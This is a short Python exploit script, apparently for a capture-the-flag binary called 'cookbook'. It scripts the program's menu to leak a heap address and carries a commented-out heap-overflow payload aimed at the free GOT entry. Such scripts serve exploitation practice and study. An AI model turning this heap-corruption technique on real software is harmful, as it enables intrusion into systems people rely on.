#!/usr/bin/python
from pwn13 import *
import ctypes


free_got = 0x804d018

def init():
    print p.sendlineafter("?","freestar")
    print p.recvuntil("t\n")

def leak():
    #heap addr leak
    p.sendline("a")
    print p.recvuntil("t)?\n")
    p.sendline("n")
    print p.recvuntil("t)?\n")
    p.sendline("d")
    print p.recvuntil("t)?\n")
    p.sendline("q")
    print p.recvuntil("t\n")
    p.sendline("g")
    print p.recvuntil(": ")
    p.sendline("84")
    p.sendline("a"*4)
    print p.recvuntil("t\n")
    p.sendline("a")
    print p.recvuntil("t)?\n")
    p.sendline("n")
    print p.recvuntil("t)?\n")
    p.sendline("l")
    print p.recvuntil("price: ")
    data = p.recvline()[:-1]
    print hex(int(data))

    print p.recvuntil("t)?\n")

    '''
    p.sendline("c")
    print p.recvuntil("t\n")
    p.sendline("n")
    print p.recvuntil("t\n")

    p.heap(0x1600, 0x100)
    p.sendline("i")
    payload = "A"*896
    payload += p32(0xffffffff)
    p.sendline(payload)
    print p.recvuntil("t\n")
    p.heap(0x1600, 0x100)

    p.sendline("q")
    print p.recvuntil("t\n")
    p.sendline("g")
    print p.recvuntil(": ")

    #size = free_got - k
    '''



if __name__ == "__main__":
    p = process("./cookbook")

    init()

    leak()

    p.close()
